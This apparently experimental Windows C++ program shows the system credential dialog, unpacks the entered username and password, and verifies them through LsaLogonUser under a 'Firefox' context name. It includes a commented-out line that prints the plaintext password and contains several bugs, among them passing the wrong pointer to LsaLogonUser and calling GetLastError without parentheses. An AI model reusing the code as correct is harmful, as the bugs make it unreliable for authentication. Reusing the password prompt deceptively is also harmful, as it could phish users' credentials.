
#include <string>
#include <stdio.h>
#include <windows.h>
#include <wincred.h>
#include <ntsecapi.h>

int main()
{
    // std::wstring strMsg = L"Please enter your password.";

    CREDUI_INFOW credui = {};
    credui.cbSize = sizeof(credui);  
    credui.hwndParent = nullptr;
    // credui.pszMessageText = strMsg.c_str();
    credui.pszCaptionText = L"Please verify your Windows user credentials to proceed.";
    credui.hbmBanner = nullptr;

    ULONG authPackage = 0;  
    LPVOID outCredBuffer = nullptr;  
    ULONG outCredSize = 0;  
    BOOL save = false;  

    // Get user's Windows credentials.
    int result = CredUIPromptForWindowsCredentialsW(&credui, 0, &authPackage,
                            nullptr, 0, &outCredBuffer, &outCredSize, &save,
                            CREDUIWIN_ENUMERATE_CURRENT_USER);
    printf("result: %lx\n", result);
    printf("authPackage: %lx\n", authPackage);

    WCHAR pszName[CREDUI_MAX_USERNAME_LENGTH*sizeof(WCHAR)];
    WCHAR pszPwd[CREDUI_MAX_PASSWORD_LENGTH*sizeof(WCHAR)];
    WCHAR domain[CREDUI_MAX_DOMAIN_TARGET_LENGTH*sizeof(WCHAR)];
    DWORD maxLenName =  CREDUI_MAX_USERNAME_LENGTH+1;
    DWORD maxLenPassword =  CREDUI_MAX_PASSWORD_LENGTH+1;
    DWORD maxLenDomain = CREDUI_MAX_DOMAIN_TARGET_LENGTH+1;
    CredUnPackAuthenticationBufferW(0, outCredBuffer,
                                    outCredSize,
                                    pszName,
                                    &maxLenName,
                                    domain,
                                    &maxLenDomain,
                                    pszPwd,
                                    &maxLenPassword);
    // wprintf(L"Credentials:\n  user: \"%s\"\n  pwd: \"%s\"\n  domain: \"%s\"\n",
    //         pszName, pszPwd, domain);

    // Get current user uid.
    HANDLE user_token;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &user_token)) {
        printf("Unable to obtain process token %lx\n", GetLastError);
        return 1;
    }

    DWORD token_info_length = 0;
    GetTokenInformation(user_token, TokenUser, nullptr, 0, &token_info_length);
    char *cur_token_info = new char[token_info_length];
    GetTokenInformation(user_token, TokenUser, cur_token_info, token_info_length, &token_info_length);
    CloseHandle(user_token);
    if (!token_info_length) {
        printf("Unable to obtain current token info %lx\n", GetLastError);
        return 1;
    }
    PSID cur_sid = reinterpret_cast<TOKEN_USER*>(cur_token_info)->User.Sid;

    // Verify the credentials
    NTSTATUS substs;
    void* profile_buffer = nullptr;
    ULONG profile_buffer_length = 0;
    QUOTA_LIMITS limits;
    LUID luid;
    HANDLE token;
    HANDLE lsa;
    LSA_STRING name;
    PCHAR context_name = const_cast<PCHAR>("Firefox");
    name.Buffer = context_name;
    name.Length = strlen(name.Buffer);
    name.MaximumLength = name.Length + 1;

    // LSA_OPERATIONAL_MODE uninteresting_mode;
    // LsaRegisterLogonProcess(&name, &lsa, &uninteresting_mode);
    if (LsaConnectUntrusted(&lsa) != ERROR_SUCCESS) {
        // couldn't get lsa handle, INVALID_HANDLE_VALUE
        printf("Error getting lsa\n");
        return 1;
    }

    TOKEN_SOURCE source;
    strcpy_s(source.SourceName, sizeof(context_name)/sizeof(*context_name),
             "Firefox");
    printf("source.SourceName: %s\n", source.SourceName);
    printf("name.Buffer: %s\n", name.Buffer);
    if (!AllocateLocallyUniqueId(&source.SourceIdentifier)) {
        printf("Last error: %lx\n", GetLastError());
        return 1;
    }

    NTSTATUS sts = LsaLogonUser(lsa, &name, Interactive, authPackage, &outCredBuffer,
                        outCredSize, nullptr, &source, &profile_buffer,
                        &profile_buffer_length, &luid, &token, &limits, &substs);
    if (sts ==  S_OK) {
        printf("Logged in successfully.\n");
    } else {
        printf("Login failed with: %lx (%lx)\n", sts, LsaNtStatusToWinError(sts));
        printf("%lx\n", luid);
    }
    LsaFreeReturnBuffer(profile_buffer);
    CloseHandle(token);
}
